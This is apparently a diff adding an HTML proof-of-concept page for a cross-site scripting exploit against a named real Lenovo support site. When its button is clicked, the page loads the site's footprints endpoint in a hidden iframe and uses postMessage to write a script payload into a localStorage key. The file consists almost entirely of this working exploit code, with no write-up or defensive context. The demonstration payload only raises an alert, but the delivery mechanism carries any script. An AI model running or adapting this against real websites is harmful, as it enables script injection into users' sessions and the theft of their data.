@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS PoC</title>
+</head>
+<body>
+    <h1>XSS Proof of Concept</h1>
+    <button id="exploit">Run Exploit</button>
+
+    <script>
+        document.getElementById('exploit').addEventListener('click', function() {
+            // Define the target origin
+            var targetOrigin = 'https://pcsupport.lenovo.com';
+
+            // Payload to be injected
+            var payload = "<script>alert('XSS');</script>";
+
+            // Crafting the message to set the payload in localStorage
+            var message = {
+                type: 'set',
+                key: 'eservice_footprints_data',
+                value: payload
+            };
+
+            // Sending the crafted message to the vulnerable page
+            var iframe = document.createElement('iframe');
+            iframe.src = targetOrigin + '/api/v4/upsellAggregation/footprints/iframe';
+            iframe.style.display = 'none';
+            iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin');
+            document.body.appendChild(iframe);
+
+            // Post the message after the iframe has loaded
+            iframe.onload = function() {
+                iframe.contentWindow.postMessage(message, targetOrigin);
+            };
+        });
+    </script>
+</body>
+</html>
